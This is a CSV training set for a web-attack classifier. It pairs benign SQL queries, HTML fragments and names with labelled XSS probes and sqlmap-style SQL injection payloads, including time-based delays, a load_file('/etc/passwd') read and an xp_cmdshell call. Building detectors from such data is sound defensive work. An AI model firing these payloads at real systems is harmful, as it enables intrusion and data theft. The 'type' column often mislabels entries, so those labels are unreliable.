Text,Label,type
<section onpointerup=alert(1)>XSS</section>,2,xss
"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'drvk' like 'drvk",1,sql
"<dir draggable=""true"" ondragleave=""alert(1)"">test</dir>",2,xss
"-1033 union all select 8731,8731,8731,8731,8731,8731--",1,sql
letemendia dou,0,xss
" SELECT column_name ( s )  FROM citizen,action",0,xss
SELECT TOP 50 PERCENT * FROM deal SELECT * FROM himself FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM feed,0,sql
"<command oncontextmenu=""alert(1)"">test</command>",2,xss
SELECT COUNT ( DISTINCT worker )  FROM jar,0,sql
cufre sans,0,sql
"   SELECT COUNT ( conversation ) , under FROM anything BY seen",0,sql
"<bgsound onmouseleave=""alert(1)"">test</bgsound>",2,xss
aedma@quadernideilgarda.ci,0,sql
"<samp onbeforecut=""alert(1)"" contenteditable>test</samp>",2,xss
"  SELECT * FROM went WHERE musical NOT IN  ( 'jack', 'settle', 'eaten' )  ",0,sql
<h1 id=x tabindex=1 onactivate=alert(1)></h1>,2,xss
"1%""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,1,xss
<template id=x tabindex=1 onbeforeactivate=alert(1)></template>,2,xss
SELECT * FROM customs WHERE beat BETWEEN '1996-07-01' AND '1996-07-31',0,xss
veit,0,sql
SELECT * FROM age ORDER BY thumb,0,sql
"	 </span> <span class=""reference-text"">",0,xss
"<caption onkeypress=""alert(1)"" contenteditable>test</caption>",2,xss
"1""  )   as qjyu where 2679  =  2679 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
"  SELECT Orders.easierrID, Employees.organized, Employees.general FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.courtID ORDER BY Orders.soonID",0,sql
"<kbd onmousedown=""alert(1)"">test</kbd>",2,xss
asander1@nutrimama.do,0,sql
"1' where 6147  =  6147   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,sql
"INSERT INTO plan  ( buffalo, particularly, pencil )  VALUES  ( 'danger', 'ready', 'bush' )  ",0,sql
SELECT AVG ( oldest ) FROM disappear SELECT SUM ( plates ) ,0,sql
robertino,0,sql
SELECT AVG ( snake ) FROM spent SELECT SUM ( nobody ) ,0,sql
<canvas onpointermove=alert(1)>XSS</canvas>,2,xss
"<nav onbeforecut=""alert(1)"" contenteditable>test</nav>",2,xss
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Computer systems<br />organization </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
buitrago pontigo,0,xss
1  )   where 6090  =  6090,1,sql
SELECT AVG ( long ) FROM danger SELECT SUM ( safe ) ,0,sql
"<select onbeforecut=""alert(1)"" contenteditable>test</select>",2,xss
36677303p,0,sql
"<h3><span class=""mw-headline"" id=""Other_sources"">Other sources ",0,xss
"<body draggable=""true"" ondrag=""alert(1)"">test</body>",2,xss
 </li>,0,xss
<select onpointerleave=alert(1)>XSS</select>,2,xss
"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""wrbs"" like ""wrbs",1,xss
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_6102e466912f5' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,sql
"<p>Scrapy is a fast high-level <a class=""reference external"" href=""https://en.wikipedia.org/wiki/Web_crawler"">web crawling</a> and <a class=""reference external"" href=""https://en.wikipedia.org/wiki/Web_scraping"">web scraping</a> framework, used",0,xss
SELECT COUNT ( butID ) FROM film,0,sql
"<LINK REL=""stylesheet"" HREF=""javascript:alert('');"">",2,xss
"<style>:target {color:red;}</style><colgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></colgroup>",2,xss
"<li id=""cite_note-Informed_search-189""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Informed_search_189-0"">^ </a> </b> ",0,xss
"<picture onkeypress=""alert(1)"" contenteditable>test</picture>",2,xss
"   SELECT Employees.youth, COUNT ( Orders.doubtID )  AS wouldFROM    ( OrdersINNER JOIN longer ON Orders.everythingID  =  Employees.orID ) ",0,sql
"-2384%'   )    )    union all select 2467,2467,2467,2467#",1,sql
"1'+  (  select sged where 1181  =  1181 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",1,sql
<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>,2,xss
"1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#",1,sql
"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""lsca"" like ""lsca",1,sql
1'+  (  select 'rsgi' where 2258  =  2258,1,sql
"	 <sup id=""cite_ref-132"" class=""reference""><a href=""#cite_note-132"">&#91;129&#93; </a> </sup> ",0,xss
"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'vcph'  =  'vcph",1,sql
1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,1,sql
"1,  (  select   (  case when   (  1255  =  8025  )   then 1 else 1255*  (  select 1255 from mysql.db  )   end   )    )   ",1,sql
5arneci052,0,sql
<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>,2,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3792 )  ORDER BY meta_id ASC",0,sql
SELECT column_names FROM table_name WHERE column_name IS NOT NULL;,0,sql
85009456f,0,sql
1'  )   where 2753  =  2753 and   (  2739  =  8047  )  *8047--,1,sql
SELECT * FROM edge WHERE electric = 'flies'  OR saw = 'shaking',0,sql
"<ul><li><a href=""#CITEREFDreyfus1972"">Dreyfus 1972 </a>, <a href=""#CITEREFDreyfusDreyfus1986"">Dreyfus &amp; Dreyfus 1986 </a> </li>",0,xss
DELETE FROM physical,0,xss
<svg><rt onload=alert(1)></rt>,2,xss
SELECT AVG ( Price ) FROM his,0,sql
"    <div class=""rst-footer-buttons"" role=""navigation"" aria-label=""footer navigation"">",0,xss
SELECT * FROM in FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM women,0,sql
"<style>:target {color: red;}</style><caption id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></caption>",2,xss
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,sql
 </li>,0,xss
"	 </span> <span class=""reference-text""><a href=""/wiki/Paul_Werbos"" title=""Paul Werbos"">Paul Werbos </a>, ""Beyond Regression: New Tools for Prediction and Analysis in the Behavioral Sciences"", <i>PhD thesis, Harvard University </i>, 1974. ",0,xss
"<dl class=""docutils"">",0,xss
"-4736'   )    )    or elt  (  5835  =  5509,5509  )   and    (    (   'iawg'  =  'iawg",1,xss
38449362d,0,sql
"<li><a href=""/wiki/Learning_classifier_system"" title=""Learning classifier system"">Learning classifier system </a> </li> </ul>",0,xss
SELECT building ( s )  FROM eaten SELECT write ( s ) ,0,sql
19432,0,sql
SELECT WEEKDAY ( CURDATE (   )  )  ;,0,xss
SELECT TOP 50 PERCENT * FROM badly SELECT * FROM thee FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM leave,0,sql
4s2cu8e44,0,sql
 (  select   (  case when   (  9525  =  9280  )   then 9525 else 9525*  (  select 9525 from master..sysdatabases  )   end   )    ) ,1,sql
"  SELECT ever,moon,husband FROM loss LEFT JOIN Orders ON special.porchID =  cave.bite ORDER BY remain.they",0,sql
<area id=x tabindex=1 onactivate=alert(1)></area>,2,xss
"	 <div style=""padding:0em 0.25em"">",0,xss
"1%'   )    )    and make_set  (  6527  =  9529,9529  )   and    (    (   '%'  =  '",1,xss
1 where 4519  =  4519,1,sql
9.12244E+15,0,sql
c/ doctores lasso simarro 30,0,xss
SELECT * FROM perfectly WHERE canal = 'sum'  AND City = 'belt',0,sql
<set onpointerenter=alert(1)>XSS</set>,2,xss
SELECT AVG ( folks ) FROM able,0,sql
tas9go,0,sql
50269,0,sql
"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""arqb"" like ""arqb",1,sql
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,sql
SELECT * FROM excellent FETCH FIRST 3 ROWS ONLY,0,xss
<frameset id=x tabindex=1 onactivate=alert(1)></frameset>,2,xss
<textarea onblur=alert(1) id=x></textarea><input autofocus>,2,xss
pia rusch,0,xss
SELECT * FROM salt WHERE center NOT LIKE 'breath%',0,sql
SELECT AVG ( country ) FROM recognize,0,sql
SELECT * FROM Customers; DELETE FROM Customers  WHERE CustomerName = 'Alfreds Futterkiste';,0,sql
6252,0,sql
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""zyoo""  =  ""zyoo",1,sql
SELECT AVG ( Price ) FROM thus,0,sql
SELECT * FROM  ( SELECT bear FROM walk ) ,0,sql
SELECT AVG ( favorite ) FROM softly,0,sql
7.17889E+15,0,sql
SELECT TOP 3 * FROM paper WHERE wrapped = 'mistake',0,sql
"1'+  (  select 'bztp' where 2541  =  2541 union all select null,null,null,null,null,null,null,null,null,null--",1,sql
4341,0,sql
1.89129E+15,0,sql
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'qfls'  =  'qfls",1,sql
SELECT AVG ( rice ) FROM car,0,sql
"<style ondblclick=""alert(1)"">test</style>",2,xss
SELECT AVG ( Price )  AS   AveragePrice FROM Products;,0,sql
"calle sierra del quintanar, 199 9-b",0,xss
SELECT * FROM gravity WHERE breathe = 'however'  OR identity = 'hungry',0,sql
"	 </span> <span class=""reference-text"">",0,xss
<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>,2,xss
"<div id=""p-variants"" role=""navigation"" class=""vectorMenu emptyPortlet"" aria-labelledby=""p-variants-label"">",0,xss
"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",1,xss
"1%"" waitfor delay '0:0:5' and ""%""  =  """,1,sql
"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",1,sql
cosmlogo,0,sql
"   SELECT COUNT ( cup ) , ate FROM number BY sugar",0,xss
04492457m,0,sql
" SELECT * FROM vapor ORDER BY adjective, consider",0,sql
select   (  case when   (  6969  =  5797  )   then 6969 else 6969*  (  select 6969 from information_schema.character_sets  )   end  )  #,1,sql
pro8i2ic6r,0,xss
"-8040""   )    )     )   or make_set  (  3916  =  6787,6787  )   and    (    (     (  ""laar"" like ""laar",1,sql
"-5800""  )   or 6872  =  6872 and   (  ""tcab"" like ""tcab",1,sql
"1%""  )   and 7533  =  7533 and   (  ""%""  =  """,1,sql
SELECT surprise FROM stomach,0,sql
kelcy,0,sql
 ,0,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367748 )  ORDER BY meta_id ASC",0,sql
campe6n,0,sql
"<script type=""text/javascript"">",0,xss
<source onpointerout=alert(1)>XSS</source>,2,xss
"<center oncopy=""alert(1)"" contenteditable>test</center>",2,xss
"1'  )   as pkis where 3446  =  3446 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,sql
SELECT * FROM bread ORDER BY temperature DESC,0,sql
"<noembed draggable=""true"" ondragenter=""alert(1)"">test</noembed>",2,xss
"1' in boolean mode  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  #",1,sql
DELETE FROM pink,0,sql
" SELECT column_name ( s )  FROM might,birth",0,sql
SELECT * FROM those,0,sql
--,1,sql
"<rp onpaste=""alert(1)"" contenteditable>test</rp>",2,xss
SELECT * FROM bicycle WHERE ten = 'road',0,xss
"<header oncut=""alert(1)"" contenteditable>test</header>",2,xss
agustn,0,sql
"1""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""sjiz"" like ""sjiz",1,xss
<nextid onpointerover=alert(1)>XSS</nextid>,2,xss
7529,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.mckinsey.com/business-functions/mckinsey-analytics/our-insights/ask-the-ai-experts-whats-driving-todays-progress-in-ai"">""Ask the AI experts: What's driving today's progress in AI?"" </a>. <i>McKinsey &amp; Company </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">13 April ",0,xss
SELECT * FROM language WHERE vote NOT LIKE 'tobacco%',0,sql
SELECT * FROM still WHERE center = 'consonant'  AND  ( far = 'wonder' OR pink = 'cast' ) ,0,sql
"1%'  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
	 </span> 2019 ,0,xss
SELECT column_name ( s )   FROM table_name,0,sql
12306474w,0,xss
"<p>There is no established unifying theory or <a href=""/wiki/Paradigm"" title=""Paradigm"">paradigm </a> that guides AI research. Researchers disagree about many issues.<sup id=""cite_ref-155"" class=""reference""><a href=""#cite_note-155"">&#91;152&#93; </a> </sup> A few of the most long standing questions that have remained unanswered are these: should artificial intelligence simulate natural intelligence by studying <a href=""/wiki/Psychology"" title=""Psychology"">psychology </a> or <a href=""/wiki/Neuroscience"" title=""Neuroscience"">neurobiology </a>? Or is <a href=""/wiki/Human_biology"" title=""Human biology"">human biology </a> as irrelevant to AI research as bird biology is to <a href=""/wiki/Aeronautical_engineering"" class=""mw-redirect"" title=""Aeronautical engineering"">aeronautical engineering </a>",0,xss
"<li><a href=""/wiki/Optical_disc#Fourth-generation"" title=""Optical disc"">Fourth-generation optical discs </a>",0,xss
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,sql
"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'cpoy'  =  'cpoy",1,sql
SELECT * FROM policeman FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM half,0,sql
 </p>,0,xss
UNION ALL SELECT,1,sql
20120,0,sql
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onanimationstart=""alert(1)""></samp>",2,xss
	 </span> 2019 ,0,xss
"<header oncontextmenu=""alert(1)"">test</header>",2,xss
SELECT * FROM consist WHERE at  BETWEEN 10 AND 20,0,xss
"-9886%'   )    )     )   union all select 5191,5191,5191,5191,5191,5191,5191--",1,xss
"  SELECT substanceID AS ID, instant AS triangle FROM bush",0,sql
"1   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  1205  =  1205",1,sql
1%'   )    )    and   (  8853  =  9924  )  *9924 and    (    (   '%'  =  ',1,sql
"<slot onmouseout=""alert(1)"">test</slot>",2,xss
SELECT Count ( * )  AS lay,0,sql
"1""  )   and 4595  =  4595#",1,sql
-4262%'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',1,sql
1'  )   as ubvf where 5923  =  5923 and 8490  =  4925--,1,sql
SELECT catch ( s )  FROM field,0,sql
select   (  case when   (  3672  =  8360  )   then 3672 else 3672*  (  select 3672 from information_schema.character_sets  )   end  )  #,1,sql
	 </span> </h3>,0,xss
"<bgsound ondblclick=""alert(1)"">test</bgsound>",2,xss
"<style>@keyframes x{}</style><bdo style=""animation-name:x"" onanimationend=""alert(1)""></bdo>",2,xss
23 or 1  =  1; --,1,xss
"document.getElementsByClassName("""").length",2,xss
"<label oncut=""alert(1)"" contenteditable>test</label>",2,xss
389,0,xss
SELECT TOP 3 * FROM attack WHERE doctor = 'coat' SELECT * FROM smaller,0,sql
SELECT AVG ( waste ) FROM expect,0,sql
1'||  (  select 'vpuh' where 8164  =  8164,1,sql
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""menm"" like ""menm",1,xss
DELETE FROM exercise,0,xss
1%' and   (  3020  =  3020  )  *6703 and '%'  =  ',1,sql
"1   )    )    as nxdf where 1696  =  1696 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sql
select   (  case when   (  8841  =  9675  )   then 8841 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
muriel de la fuente,0,sql
tsoucas,0,sql
"   SELECT Employees.nails, COUNT ( Orders.paragraphID )  AS soapFROM    ( OrdersINNER JOIN sometime ON Orders.rulerID  =  Employees.danceID ) ",0,sql
3953,0,sql
"  SELECT pilotID AS ID, duty AS middle FROM concerned",0,xss
calle el milagrena s/n 10a,0,sql
"<li id=""cite_note-143""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-143"">^ </a> </b> ",0,xss
SELECT essential ( s )  FROM like SELECT forgot ( s ) ,0,sql
